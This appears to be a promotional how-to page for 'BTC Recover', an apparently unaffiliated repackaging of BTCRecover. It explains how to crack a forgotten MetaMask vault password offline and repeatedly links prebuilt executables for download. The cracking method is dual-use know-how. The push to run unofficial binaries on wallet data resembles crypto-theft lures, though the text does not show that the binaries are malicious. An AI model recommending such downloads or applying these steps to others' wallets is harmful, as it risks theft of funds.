<p align="center"><img src="https://github.com/btc-recover-tool/learn/raw/HEAD/assets/banner-article.png" alt="BTC Recover MetaMask vault password" width="100%"></p>
<h1 align="center">BTC Recover MetaMask vault password</h1>
<p align="center">Recover the password on a MetaMask browser vault.</p>

<p align="center">
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-FBB034?style=for-the-badge&logo=windows&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Windows"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-FBB034?style=for-the-badge&logo=apple&logoColor=1C1E22&labelColor=1C1E22" alt="Download for macOS"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-FBB034?style=for-the-badge&logo=linux&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Linux"></a>
</p>

| Platform | Requirements | File |
|---|---|---|
| 🪟 Windows | Windows 10 or later, 64-bit | [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) |
| 🍎 macOS | macOS 10.13 High Sierra or later | [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) |
| 🐧 Linux | 64-bit (x86_64) distribution | [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) |

All versions and checksums are on the [v2.1.0 release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

> [!IMPORTANT]
> Only download from this GitHub release page.


---

## 💡 Short answer

Extract the MetaMask vault data and let BTC Recover test passwords offline.

## 👀 You'll see this if

- MetaMask asks for a password you forgot
- You have no Secret Recovery Phrase
- The browser profile still exists

## 🤔 Why it happens

MetaMask stores an encrypted vault in the browser profile. With that data, password guesses can be tested offline.

What makes this approach work is that most lockouts are small mistakes, not total losses: one smudged word, two swapped words, a password with a different capital letter. A program that tests those small variations quickly can often find the answer you were one step away from.

The tool works from your clues. You tell it what you know for certain and what you are unsure of, and it turns that into a list of candidates. Each candidate is checked against your wallet, and the search stops when one fits. The narrower your clues, the faster the answer.

**Words worth knowing.** A seed phrase (or recovery phrase) is the list of 12 or 24 words that can rebuild your wallet. A passphrase is an optional extra word or sentence added on top of it that creates a separate wallet. A derivation path is the route a wallet follows from the seed to its addresses. A checksum is a built-in check that lets software reject a wrong phrase straight away.

**What a good session looks like.** You sit down with your notes, an offline computer and enough time. You run the smallest likely search first and note the result. If it fails, you widen one thing at a time, never several at once, so you always know what has been ruled out. Most successful recoveries look like this: methodical, unhurried and entirely private.

## 🧭 Before you begin

If you tried things before, list them. Knowing which guesses already failed avoids repeating them and helps you see a pattern, such as always mistyping the same letter or always adding the same number at the end.

Install first, then go offline. Turn off Wi-Fi and unplug any network cable before you type a seed word, a password or open a wallet file. Close chat apps, browsers and remote-desktop tools. When you finish, write the result on paper and remove any working files before you reconnect.

Run through this list once: did you hash the installer and compare it? Is Wi-Fi off and the cable unplugged? Are you working on a copy of any wallet file rather than the original? Have you started with the smallest likely search? Ticking these four boxes avoids the most common wasted hours.

## 🛠️ Step-by-step fix

1. Go offline.
2. Locate the vault data.
3. Copy it.
4. List password pieces.
5. Run.
6. Restore.

If this is your first run, the [first recovery walkthrough](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-first-recovery-walkthrough.md) shows each screen. Need the installer checked first? See [verifying your BTC Recover download](https://github.com/btc-recover-tool/learn/blob/main/how-to/verify-btc-recover-download-sha256.md).

## 🔁 If that did not work

- Check the right browser profile
- Expand tokens
- Use the recovery phrase if found

Honest expectations help: BTC Recover improves your odds by testing likely mistakes quickly, but it cannot invent information that is gone. If nothing matches after the likely cases, recheck the facts you were sure of.

**A typical case.** Someone finds their backup card after a house move. Eleven words are clear, one is water-stained, and they remember the wallet app but not the year. They write the eleven words down in order, mark the stained position, add the first receiving address from an old email and start the search offline. The point is not speed; it is that each detail they added removed guesses the tool would otherwise have to make, so the run stayed small and calm from start to finish.

A related problem may be the real cause: try [btc recover multibit wallet recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-multibit-wallet-recovery.md).

Help is available in public on GitHub. A good request names the wallet app, the phrase length, how many words or characters are uncertain and any message you saw. Anyone who moves the conversation to private messages and asks for your data is not there to help.

Be realistic about large searches. Every unknown multiplies the work, so some cases finish in seconds and others are very long. When the estimate shows can't estimate, the most useful step is to remember or rule out one more detail.

## 🛡️ Prevention

- Back up the Secret Recovery Phrase
- Use a manager
- Keep the browser profile

After a successful recovery, make a better backup: write the phrase clearly, number the words, store two copies in different places and consider a metal plate for durability. Then restore from the backup once to prove it works.

**Never paste a seed into a website.** A page that asks for your recovery phrase to check or fix it is designed to steal it. BTC Recover is a program that runs on your machine, not a web form.

## ❓ FAQ

**Where is the vault?**
In the browser extension storage.

**Does it need internet?**
No.

**Phone app?**
Desktop vault data only.

**Is BTC Recover free?**
Yes. There is no account, trial or fee on recovered funds.

---

## ⬇️ Download

Get [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) for Windows, [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) for macOS or [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) for Linux. Checksums are on the [release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

## 🔗 Related guides

- [BTC Recover wallet.dat password recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-wallet-dat-password.md)
- [BTC Recover password token list](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-password-token-list.md)
- [BTC Recover typo password recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-typo-password-recovery.md)
- [All BTC Recover guides](https://github.com/btc-recover-tool/learn)

_BTC Recover is an independent project built on BTCRecover, created by Christopher Gurnee in 2014 and maintained by 3rdIteration. It is not affiliated with or endorsed by either._
